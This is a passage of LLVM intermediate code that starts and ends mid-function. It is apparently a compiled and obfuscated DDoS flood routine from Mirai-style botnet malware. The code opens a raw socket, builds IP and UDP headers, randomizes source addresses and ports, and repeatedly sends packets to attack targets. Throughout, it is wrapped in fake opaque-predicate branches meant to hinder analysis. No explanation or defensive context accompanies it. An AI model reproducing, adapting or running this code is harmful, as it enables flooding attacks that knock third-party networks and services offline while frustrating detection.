  %72 = load i8, i8* %15, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %74 = load i32, i32* @LOCAL_ADDR, align 4
  %75 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 25, i32 %74)
  store i32 %75, i32* %28, align 4
  %76 = load i16, i16* %26, align 2
  %77 = zext i16 %76 to i32
  %78 = icmp sgt i32 %77, 1460
  %79 = load i32, i32* @x.33
  %80 = load i32, i32* @y.34
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %78, label %87, label %104

; <label>:87:                                     ; preds = %originalBBpart2
  %88 = load i32, i32* @x.33
  %89 = load i32, i32* @y.34
  %90 = sub i32 %88, 1
  %91 = mul i32 %88, %90
  %92 = urem i32 %91, 2
  %93 = icmp eq i32 %92, 0
  %94 = icmp slt i32 %89, 10
  %95 = or i1 %93, %94
  br i1 %95, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %87
  store i16 1460, i16* %26, align 2
  %96 = load i32, i32* @x.33
  %97 = load i32, i32* @y.34
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %104

; <label>:104:                                    ; preds = %originalBBpart24, %originalBBpart2
  %105 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %105, i32* %18, align 4
  %106 = icmp eq i32 %105, -1
  br i1 %106, label %107, label %108

; <label>:107:                                    ; preds = %104
  br label %504

; <label>:108:                                    ; preds = %104
  %109 = load i32, i32* @x.33
  %110 = load i32, i32* @y.34
  %111 = sub i32 %109, 1
  %112 = mul i32 %109, %111
  %113 = urem i32 %112, 2
  %114 = icmp eq i32 %113, 0
  %115 = icmp slt i32 %110, 10
  %116 = or i1 %114, %115
  br i1 %116, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %108
  store i32 1, i32* %17, align 4
  %117 = load i32, i32* %18, align 4
  %118 = bitcast i32* %17 to i8*
  %119 = call i32 @setsockopt(i32 %117, i32 0, i32 3, i8* %118, i32 4) #6
  %120 = icmp eq i32 %119, -1
  %121 = load i32, i32* @x.33
  %122 = load i32, i32* @y.34
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %120, label %129, label %148

; <label>:129:                                    ; preds = %originalBBpart28
  %130 = load i32, i32* @x.33
  %131 = load i32, i32* @y.34
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %129
  %138 = load i32, i32* %18, align 4
  %139 = call i32 @close(i32 %138)
  %140 = load i32, i32* @x.33
  %141 = load i32, i32* @y.34
  %142 = sub i32 %140, 1
  %143 = mul i32 %140, %142
  %144 = urem i32 %143, 2
  %145 = icmp eq i32 %144, 0
  %146 = icmp slt i32 %141, 10
  %147 = or i1 %145, %146
  br i1 %147, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %504

; <label>:148:                                    ; preds = %originalBBpart28
  store i32 0, i32* %17, align 4
  br label %149

; <label>:149:                                    ; preds = %231, %148
  %150 = load i32, i32* %17, align 4
  %151 = load i8, i8* %13, align 1
  %152 = zext i8 %151 to i32
  %153 = icmp slt i32 %150, %152
  br i1 %153, label %154, label %234

; <label>:154:                                    ; preds = %149
  %155 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %156 = load i8**, i8*** %19, align 8
  %157 = load i32, i32* %17, align 4
  %158 = sext i32 %157 to i64
  %159 = getelementptr inbounds i8*, i8** %156, i64 %158
  store i8* %155, i8** %159, align 8
  %160 = load i8**, i8*** %19, align 8
  %161 = load i32, i32* %17, align 4
  %162 = sext i32 %161 to i64
  %163 = getelementptr inbounds i8*, i8** %160, i64 %162
  %164 = load i8*, i8** %163, align 8
  %165 = bitcast i8* %164 to %struct.iphdr*
  store %struct.iphdr* %165, %struct.iphdr** %29, align 8
  %166 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i64 1
  %168 = bitcast %struct.iphdr* %167 to %struct.udphdr*
  store %struct.udphdr* %168, %struct.udphdr** %30, align 8
  %169 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %170 = bitcast %struct.iphdr* %169 to i8*
  %171 = load i8, i8* %170, align 4
  %172 = and i8 %171, 15
  %173 = or i8 %172, 64
  store i8 %173, i8* %170, align 4
  %174 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %175 = bitcast %struct.iphdr* %174 to i8*
  %176 = load i8, i8* %175, align 4
  %177 = and i8 %176, -16
  %178 = or i8 %177, 5
  store i8 %178, i8* %175, align 4
  %179 = load i8, i8* %20, align 1
  %180 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %181 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %180, i32 0, i32 1
  store i8 %179, i8* %181, align 1
  %182 = load i16, i16* %26, align 2
  %183 = zext i16 %182 to i64
  %184 = add i64 28, %183
  %185 = trunc i64 %184 to i16
  %186 = call zeroext i16 @htons(i16 zeroext %185) #7
  %187 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %188 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %187, i32 0, i32 2
  store i16 %186, i16* %188, align 2
  %189 = load i16, i16* %21, align 2
  %190 = call zeroext i16 @htons(i16 zeroext %189) #7
  %191 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %192 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %191, i32 0, i32 3
  store i16 %190, i16* %192, align 4
  %193 = load i8, i8* %22, align 1
  %194 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %195 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %194, i32 0, i32 5
  store i8 %193, i8* %195, align 4
  %196 = load i8, i8* %23, align 1
  %197 = icmp ne i8 %196, 0
  br i1 %197, label %198, label %202

; <label>:198:                                    ; preds = %154
  %199 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %200 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %201 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %200, i32 0, i32 4
  store i16 %199, i16* %201, align 2
  br label %202

; <label>:202:                                    ; preds = %198, %154
  %203 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %204 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %203, i32 0, i32 6
  store i8 17, i8* %204, align 1
  %205 = load i32, i32* %28, align 4
  %206 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %207 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %206, i32 0, i32 8
  store i32 %205, i32* %207, align 4
  %208 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %209 = load i32, i32* %17, align 4
  %210 = sext i32 %209 to i64
  %211 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %208, i64 %210
  %212 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %211, i32 0, i32 1
  %213 = load i32, i32* %212, align 4
  %214 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %215 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %214, i32 0, i32 9
  store i32 %213, i32* %215, align 4
  %216 = load i16, i16* %24, align 2
  %217 = call zeroext i16 @htons(i16 zeroext %216) #7
  %218 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %219 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %218, i32 0, i32 0
  store i16 %217, i16* %219, align 2
  %220 = load i16, i16* %25, align 2
  %221 = call zeroext i16 @htons(i16 zeroext %220) #7
  %222 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %223 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %222, i32 0, i32 1
  store i16 %221, i16* %223, align 2
  %224 = load i16, i16* %26, align 2
  %225 = zext i16 %224 to i64
  %226 = add i64 8, %225
  %227 = trunc i64 %226 to i16
  %228 = call zeroext i16 @htons(i16 zeroext %227) #7
  %229 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %230 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %229, i32 0, i32 2
  store i16 %228, i16* %230, align 2
  br label %231

; <label>:231:                                    ; preds = %202
  %232 = load i32, i32* %17, align 4
  %233 = add nsw i32 %232, 1
  store i32 %233, i32* %17, align 4
  br label %149

; <label>:234:                                    ; preds = %149
  br label %235

; <label>:235:                                    ; preds = %503, %234
  %236 = load i32, i32* @x.33
  %237 = load i32, i32* @y.34
  %238 = sub i32 %236, 1
  %239 = mul i32 %236, %238
  %240 = urem i32 %239, 2
  %241 = icmp eq i32 %240, 0
  %242 = icmp slt i32 %237, 10
  %243 = or i1 %241, %242
  br i1 %243, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %235
  store i32 0, i32* %17, align 4
  %244 = load i32, i32* @x.33
  %245 = load i32, i32* @y.34
  %246 = sub i32 %244, 1
  %247 = mul i32 %244, %246
  %248 = urem i32 %247, 2
  %249 = icmp eq i32 %248, 0
  %250 = icmp slt i32 %245, 10
  %251 = or i1 %249, %250
  br i1 %251, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %252

; <label>:252:                                    ; preds = %originalBBpart260, %originalBBpart216
  %253 = load i32, i32* @x.33
  %254 = load i32, i32* @y.34
  %255 = sub i32 %253, 1
  %256 = mul i32 %253, %255
  %257 = urem i32 %256, 2
  %258 = icmp eq i32 %257, 0
  %259 = icmp slt i32 %254, 10
  %260 = or i1 %258, %259
  br i1 %260, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %252
  %261 = load i32, i32* %17, align 4
  %262 = load i8, i8* %13, align 1
  %263 = zext i8 %262 to i32
  %264 = icmp slt i32 %261, %263
  %265 = load i32, i32* @x.33
  %266 = load i32, i32* @y.34
  %267 = sub i32 %265, 1
  %268 = mul i32 %265, %267
  %269 = urem i32 %268, 2
  %270 = icmp eq i32 %269, 0
  %271 = icmp slt i32 %266, 10
  %272 = or i1 %270, %271
  br i1 %272, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %264, label %273, label %503

; <label>:273:                                    ; preds = %originalBBpart220
  %274 = load i8**, i8*** %19, align 8
  %275 = load i32, i32* %17, align 4
  %276 = sext i32 %275 to i64
  %277 = getelementptr inbounds i8*, i8** %274, i64 %276
  %278 = load i8*, i8** %277, align 8
  store i8* %278, i8** %31, align 8
  %279 = load i8*, i8** %31, align 8
  %280 = bitcast i8* %279 to %struct.iphdr*
  store %struct.iphdr* %280, %struct.iphdr** %32, align 8
  %281 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %282 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %281, i64 1
  %283 = bitcast %struct.iphdr* %282 to %struct.udphdr*
  store %struct.udphdr* %283, %struct.udphdr** %33, align 8
  %284 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %285 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %284, i64 1
  %286 = bitcast %struct.udphdr* %285 to i8*
  store i8* %286, i8** %34, align 8
  %287 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %288 = load i32, i32* %17, align 4
  %289 = sext i32 %288 to i64
  %290 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %287, i64 %289
  %291 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %290, i32 0, i32 2
  %292 = load i8, i8* %291, align 4
  %293 = zext i8 %292 to i32
  %294 = icmp slt i32 %293, 32
  br i1 %294, label %295, label %332

; <label>:295:                                    ; preds = %273
  %296 = load i32, i32* @x.33
  %297 = load i32, i32* @y.34
  %298 = sub i32 %296, 1
  %299 = mul i32 %296, %298
  %300 = urem i32 %299, 2
  %301 = icmp eq i32 %300, 0
  %302 = icmp slt i32 %297, 10
  %303 = or i1 %301, %302
  br i1 %303, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %295
  %304 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %305 = load i32, i32* %17, align 4
  %306 = sext i32 %305 to i64
  %307 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %304, i64 %306
  %308 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %307, i32 0, i32 1
  %309 = load i32, i32* %308, align 4
  %310 = call i32 @ntohl(i32 %309) #7
  %311 = call i32 @rand_next()
  %312 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %313 = load i32, i32* %17, align 4
  %314 = sext i32 %313 to i64
  %315 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %312, i64 %314
  %316 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %315, i32 0, i32 2
  %317 = load i8, i8* %316, align 4
  %318 = zext i8 %317 to i32
  %319 = lshr i32 %311, %318
  %320 = add i32 %310, %319
  %321 = call i32 @htonl(i32 %320) #7
  %322 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %323 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %322, i32 0, i32 9
  store i32 %321, i32* %323, align 4
  %324 = load i32, i32* @x.33
  %325 = load i32, i32* @y.34
  %326 = sub i32 %324, 1
  %327 = mul i32 %324, %326
  %328 = urem i32 %327, 2
  %329 = icmp eq i32 %328, 0
  %330 = icmp slt i32 %325, 10
  %331 = or i1 %329, %330
  br i1 %331, label %originalBBpart232, label %originalBB22alteredBB

originalBBpart232:                                ; preds = %originalBB22
  br label %332

; <label>:332:                                    ; preds = %originalBBpart232, %273
  %333 = load i32, i32* %28, align 4
  %334 = icmp eq i32 %333, -1
  br i1 %334, label %335, label %355

; <label>:335:                                    ; preds = %332
  %336 = load i32, i32* @x.33
  %337 = load i32, i32* @y.34
  %338 = sub i32 %336, 1
  %339 = mul i32 %336, %338
  %340 = urem i32 %339, 2
  %341 = icmp eq i32 %340, 0
  %342 = icmp slt i32 %337, 10
  %343 = or i1 %341, %342
  br i1 %343, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %335
  %344 = call i32 @rand_next()
  %345 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %346 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %345, i32 0, i32 8
  store i32 %344, i32* %346, align 4
  %347 = load i32, i32* @x.33
  %348 = load i32, i32* @y.34
  %349 = sub i32 %347, 1
  %350 = mul i32 %347, %349
  %351 = urem i32 %350, 2
  %352 = icmp eq i32 %351, 0
  %353 = icmp slt i32 %348, 10
  %354 = or i1 %352, %353
  br i1 %354, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br label %355

; <label>:355:                                    ; preds = %originalBBpart236, %332
  %356 = load i32, i32* @x.33
  %357 = load i32, i32* @y.34
  %358 = sub i32 %356, 1
  %359 = mul i32 %356, %358
  %360 = urem i32 %359, 2
  %361 = icmp eq i32 %360, 0
  %362 = icmp slt i32 %357, 10
  %363 = or i1 %361, %362
  br i1 %363, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %355
  %364 = load i16, i16* %21, align 2
  %365 = zext i16 %364 to i32
  %366 = icmp eq i32 %365, 65535
  %367 = load i32, i32* @x.33
  %368 = load i32, i32* @y.34
  %369 = sub i32 %367, 1
  %370 = mul i32 %367, %369
  %371 = urem i32 %370, 2
  %372 = icmp eq i32 %371, 0
  %373 = icmp slt i32 %368, 10
  %374 = or i1 %372, %373
  br i1 %374, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br i1 %366, label %375, label %380

; <label>:375:                                    ; preds = %originalBBpart240
  %376 = call i32 @rand_next()
  %377 = trunc i32 %376 to i16
  %378 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %379 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %378, i32 0, i32 3
  store i16 %377, i16* %379, align 4
  br label %380

; <label>:380:                                    ; preds = %375, %originalBBpart240
  %381 = load i16, i16* %24, align 2
  %382 = zext i16 %381 to i32
  %383 = icmp eq i32 %382, 65535
  br i1 %383, label %384, label %389

; <label>:384:                                    ; preds = %380
  %385 = call i32 @rand_next()
  %386 = trunc i32 %385 to i16
  %387 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %388 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %387, i32 0, i32 0
  store i16 %386, i16* %388, align 2
  br label %389

; <label>:389:                                    ; preds = %384, %380
  %390 = load i16, i16* %25, align 2
  %391 = zext i16 %390 to i32
  %392 = icmp eq i32 %391, 65535
  br i1 %392, label %393, label %414

; <label>:393:                                    ; preds = %389
  %394 = load i32, i32* @x.33
  %395 = load i32, i32* @y.34
  %396 = sub i32 %394, 1
  %397 = mul i32 %394, %396
  %398 = urem i32 %397, 2
  %399 = icmp eq i32 %398, 0
  %400 = icmp slt i32 %395, 10
  %401 = or i1 %399, %400
  br i1 %401, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %393
  %402 = call i32 @rand_next()
  %403 = trunc i32 %402 to i16
  %404 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %405 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %404, i32 0, i32 1
  store i16 %403, i16* %405, align 2
  %406 = load i32, i32* @x.33
  %407 = load i32, i32* @y.34
  %408 = sub i32 %406, 1
  %409 = mul i32 %406, %408
  %410 = urem i32 %409, 2
  %411 = icmp eq i32 %410, 0
  %412 = icmp slt i32 %407, 10
  %413 = or i1 %411, %412
  br i1 %413, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br label %414

; <label>:414:                                    ; preds = %originalBBpart244, %389
  %415 = load i32, i32* @x.33
  %416 = load i32, i32* @y.34
  %417 = sub i32 %415, 1
  %418 = mul i32 %415, %417
  %419 = urem i32 %418, 2
  %420 = icmp eq i32 %419, 0
  %421 = icmp slt i32 %416, 10
  %422 = or i1 %420, %421
  br i1 %422, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %414
  %423 = load i8, i8* %27, align 1
  %424 = icmp ne i8 %423, 0
  %425 = load i32, i32* @x.33
  %426 = load i32, i32* @y.34
  %427 = sub i32 %425, 1
  %428 = mul i32 %425, %427
  %429 = urem i32 %428, 2
  %430 = icmp eq i32 %429, 0
  %431 = icmp slt i32 %426, 10
  %432 = or i1 %430, %431
  br i1 %432, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br i1 %424, label %433, label %437

; <label>:433:                                    ; preds = %originalBBpart248
  %434 = load i8*, i8** %34, align 8
  %435 = load i16, i16* %26, align 2
  %436 = zext i16 %435 to i32
  call void @rand_str(i8* %434, i32 %436)
  br label %437

; <label>:437:                                    ; preds = %433, %originalBBpart248
  %438 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %439 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %438, i32 0, i32 7
  store i16 0, i16* %439, align 2
  %440 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %441 = bitcast %struct.iphdr* %440 to i16*
  %442 = call zeroext i16 @checksum_generic(i16* %441, i32 20)
  %443 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %444 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %443, i32 0, i32 7
  store i16 %442, i16* %444, align 2
  %445 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %446 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %445, i32 0, i32 3
  store i16 0, i16* %446, align 2
  %447 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %448 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %449 = bitcast %struct.udphdr* %448 to i8*
  %450 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %451 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %450, i32 0, i32 2
  %452 = load i16, i16* %451, align 2
  %453 = load i16, i16* %26, align 2
  %454 = zext i16 %453 to i64
  %455 = add i64 8, %454
  %456 = trunc i64 %455 to i32
  %457 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %447, i8* %449, i16 zeroext %452, i32 %456)
  %458 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %459 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %458, i32 0, i32 3
  store i16 %457, i16* %459, align 2
  %460 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %461 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %460, i32 0, i32 1
  %462 = load i16, i16* %461, align 2
  %463 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %464 = load i32, i32* %17, align 4
  %465 = sext i32 %464 to i64
  %466 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %463, i64 %465
  %467 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %466, i32 0, i32 0
  %468 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %467, i32 0, i32 1
  store i16 %462, i16* %468, align 2
  %469 = load i32, i32* %18, align 4
  %470 = load i8*, i8** %31, align 8
  %471 = load i16, i16* %26, align 2
  %472 = zext i16 %471 to i64
  %473 = add i64 28, %472
  %474 = bitcast %union.__CONST_SOCKADDR_ARG* %35 to %struct.sockaddr**
  %475 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %476 = load i32, i32* %17, align 4
  %477 = sext i32 %476 to i64
  %478 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %475, i64 %477
  %479 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %478, i32 0, i32 0
  %480 = bitcast %struct.sockaddr_in* %479 to %struct.sockaddr*
  store %struct.sockaddr* %480, %struct.sockaddr** %474, align 8
  %481 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %35, i32 0, i32 0
  %482 = load %struct.sockaddr*, %struct.sockaddr** %481, align 8
  %483 = call i64 @sendto(i32 %469, i8* %470, i64 %473, i32 16384, %struct.sockaddr* %482, i32 16)
  br label %484

; <label>:484:                                    ; preds = %437
  %485 = load i32, i32* @x.33
  %486 = load i32, i32* @y.34
  %487 = sub i32 %485, 1
  %488 = mul i32 %485, %487
  %489 = urem i32 %488, 2
  %490 = icmp eq i32 %489, 0
  %491 = icmp slt i32 %486, 10
  %492 = or i1 %490, %491
  br i1 %492, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %484
  %493 = load i32, i32* %17, align 4
  %494 = add nsw i32 %493, 1
  store i32 %494, i32* %17, align 4
  %495 = load i32, i32* @x.33
  %496 = load i32, i32* @y.34
  %497 = sub i32 %495, 1
  %498 = mul i32 %495, %497
  %499 = urem i32 %498, 2
  %500 = icmp eq i32 %499, 0
  %501 = icmp slt i32 %496, 10
  %502 = or i1 %500, %501
  br i1 %502, label %originalBBpart260, label %originalBB50alteredBB

originalBBpart260:                                ; preds = %originalBB50
  br label %252

; <label>:503:                                    ; preds = %originalBBpart220
  br label %235

; <label>:504:                                    ; preds = %originalBBpart212, %107
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %4
  %505 = alloca i8, align 1
  %506 = alloca %struct.attack_target*, align 8
  %507 = alloca i8, align 1
  %508 = alloca %struct.attack_option*, align 8
  %509 = alloca i32, align 4
  %510 = alloca i32, align 4
  %511 = alloca i8**, align 8
  %512 = alloca i8, align 1
  %513 = alloca i16, align 2
  %514 = alloca i8, align 1
  %515 = alloca i8, align 1
  %516 = alloca i16, align 2
  %517 = alloca i16, align 2
  %518 = alloca i16, align 2
  %519 = alloca i8, align 1
  %520 = alloca i32, align 4
  %521 = alloca %struct.iphdr*, align 8
  %522 = alloca %struct.udphdr*, align 8
  %523 = alloca i8*, align 8
  %524 = alloca %struct.iphdr*, align 8
  %525 = alloca %struct.udphdr*, align 8
  %526 = alloca i8*, align 8
  %527 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %505, align 1
  store %struct.attack_target* %1, %struct.attack_target** %506, align 8
  store i8 %2, i8* %507, align 1
  store %struct.attack_option* %3, %struct.attack_option** %508, align 8
  %528 = load i8, i8* %505, align 1
  %529 = zext i8 %528 to i64
  %530 = call noalias i8* @calloc(i64 %529, i64 8) #6
  %531 = bitcast i8* %530 to i8**
  store i8** %531, i8*** %511, align 8
  %532 = load i8, i8* %507, align 1
  %533 = load %struct.attack_option*, %struct.attack_option** %508, align 8
  %534 = call i32 @attack_get_opt_int(i8 zeroext %532, %struct.attack_option* %533, i8 zeroext 2, i32 0)
  %535 = trunc i32 %534 to i8
  store i8 %535, i8* %512, align 1
  %536 = load i8, i8* %507, align 1
  %537 = load %struct.attack_option*, %struct.attack_option** %508, align 8
  %538 = call i32 @attack_get_opt_int(i8 zeroext %536, %struct.attack_option* %537, i8 zeroext 3, i32 65535)
  %539 = trunc i32 %538 to i16
  store i16 %539, i16* %513, align 2
  %540 = load i8, i8* %507, align 1
  %541 = load %struct.attack_option*, %struct.attack_option** %508, align 8
  %542 = call i32 @attack_get_opt_int(i8 zeroext %540, %struct.attack_option* %541, i8 zeroext 4, i32 64)
  %543 = trunc i32 %542 to i8
  store i8 %543, i8* %514, align 1
  %544 = load i8, i8* %507, align 1
  %545 = load %struct.attack_option*, %struct.attack_option** %508, align 8
  %546 = call i32 @attack_get_opt_int(i8 zeroext %544, %struct.attack_option* %545, i8 zeroext 5, i32 0)
  %547 = trunc i32 %546 to i8
  store i8 %547, i8* %515, align 1
  %548 = load i8, i8* %507, align 1
  %549 = load %struct.attack_option*, %struct.attack_option** %508, align 8
  %550 = call i32 @attack_get_opt_int(i8 zeroext %548, %struct.attack_option* %549, i8 zeroext 6, i32 65535)
  %551 = trunc i32 %550 to i16
  store i16 %551, i16* %516, align 2
  %552 = load i8, i8* %507, align 1
  %553 = load %struct.attack_option*, %struct.attack_option** %508, align 8
  %554 = call i32 @attack_get_opt_int(i8 zeroext %552, %struct.attack_option* %553, i8 zeroext 7, i32 65535)
  %555 = trunc i32 %554 to i16
  store i16 %555, i16* %517, align 2
  %556 = load i8, i8* %507, align 1
  %557 = load %struct.attack_option*, %struct.attack_option** %508, align 8
  %558 = call i32 @attack_get_opt_int(i8 zeroext %556, %struct.attack_option* %557, i8 zeroext 0, i32 512)
  %559 = trunc i32 %558 to i16
  store i16 %559, i16* %518, align 2
  %560 = load i8, i8* %507, align 1
  %561 = load %struct.attack_option*, %struct.attack_option** %508, align 8
  %562 = call i32 @attack_get_opt_int(i8 zeroext %560, %struct.attack_option* %561, i8 zeroext 1, i32 1)
  %563 = trunc i32 %562 to i8
  store i8 %563, i8* %519, align 1
  %564 = load i8, i8* %507, align 1
  %565 = load %struct.attack_option*, %struct.attack_option** %508, align 8
  %566 = load i32, i32* @LOCAL_ADDR, align 4
  %567 = call i32 @attack_get_opt_int(i8 zeroext %564, %struct.attack_option* %565, i8 zeroext 25, i32 %566)
  store i32 %567, i32* %520, align 4
  %568 = load i16, i16* %518, align 2
  %569 = zext i16 %568 to i32
  %570 = icmp sgt i32 %569, 1460
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %87
  store i16 1460, i16* %26, align 2
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %108
  store i32 1, i32* %17, align 4
  %571 = load i32, i32* %18, align 4
  %572 = bitcast i32* %17 to i8*
  %573 = call i32 @setsockopt(i32 %571, i32 0, i32 3, i8* %572, i32 4) #6
  %574 = icmp eq i32 %573, -1
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %129
  %575 = load i32, i32* %18, align 4
  %576 = call i32 @close(i32 %575)
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %235
  store i32 0, i32* %17, align 4
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %252
  %577 = load i32, i32* %17, align 4
  %578 = load i8, i8* %13, align 1
  %579 = zext i8 %578 to i32
  %580 = icmp slt i32 %577, %579
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %295
  %581 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %582 = load i32, i32* %17, align 4
  %583 = sext i32 %582 to i64
  %584 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %581, i64 %583
  %585 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %584, i32 0, i32 1
  %586 = load i32, i32* %585, align 4
  %587 = call i32 @ntohl(i32 %586) #7
  %588 = call i32 @rand_next()
  %589 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %590 = load i32, i32* %17, align 4
  %591 = sext i32 %590 to i64
  %592 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %589, i64 %591
